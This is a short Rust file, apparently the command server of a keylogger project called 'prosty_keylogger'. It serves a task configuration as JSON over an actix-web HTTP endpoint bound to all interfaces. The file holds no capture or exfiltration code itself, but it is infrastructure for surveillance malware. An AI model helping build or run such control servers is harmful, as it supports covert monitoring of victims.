use actix_web::{App, get, HttpResponse, HttpServer, Responder, web};
use clap::Parser;
use prosty_keylogger::common::TaskConfiguration;
use crate::options::Args;

mod options;

struct AppState{
    pub config: TaskConfiguration,
}

#[get("/")]
async fn send_basic_config(data: web::Data<AppState>) -> impl Responder {
    let config_json = serde_json::to_string(&data.config).unwrap();

    //let json = serde_json::to_string(&config).unwrap();
    HttpResponse::Ok().body(config_json)
}
#[actix_web::main]
async fn main() -> std::io::Result<()>{

    let args = Args::parse();

    let config = TaskConfiguration::from(&args);
    //let config_json = serde_json::to_string(&config);


    HttpServer::new(move || {
        App::new()
            .app_data(web::Data::new(AppState{
                config: config.clone(),
            }))
            .service(send_basic_config)
    })
        .bind(("0.0.0.0", 8080))?
        .run()
        .await
}